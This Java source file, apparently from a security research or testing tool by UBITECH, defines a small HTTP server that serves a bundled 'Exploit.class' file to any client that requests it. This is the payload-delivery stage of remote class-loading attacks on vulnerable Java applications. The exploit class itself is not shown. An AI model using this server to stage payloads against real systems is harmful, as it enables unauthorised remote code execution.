/* MIT License
Copyright (c) 2021 UBITECH Ltd
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package eu.ubitech.payloadserver;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.InputStream;

/**
 *
 * @author Panagiotis Gouvas (pgouvas@ubitech.eu)
 */
public class PayloadServer implements Runnable{

    private int proxyport = 8888;
    
    public PayloadServer(int proxyport) {
        this.proxyport = proxyport;
    }    
    
    public void run() {
        try{
        HttpServer server = HttpServer.create(new InetSocketAddress(proxyport), 0);
        server.createContext("/Exploit.class", new MyHandler());
        server.setExecutor(null); // creates a default executor
        server.start();        
        System.out.println("Listening Payload Connections on 0.0.0.0:" + proxyport);
        } catch (IOException ioex){
            
        }
    }    
    
    private static byte[]  loadPayload() throws IOException{
        InputStream ins = ClassLoader.getSystemResourceAsStream("Exploit.class");
        byte[] data = new byte[ins.available()];
        ins.read(data);
        System.out.println("Exploit: " + data.length);
        return data;
    }
    
    static class MyHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange t) throws IOException {
            //String response = "This is the response";
            byte[] payload = loadPayload();
            t.sendResponseHeaders(200, payload.length);
            //t.sendResponseHeaders(200, response.length());            
            OutputStream os = t.getResponseBody();
            os.write(loadPayload());
            os.close();
        }
    }
    
    public static void main(String[] args) throws Exception {

    }    
    
}
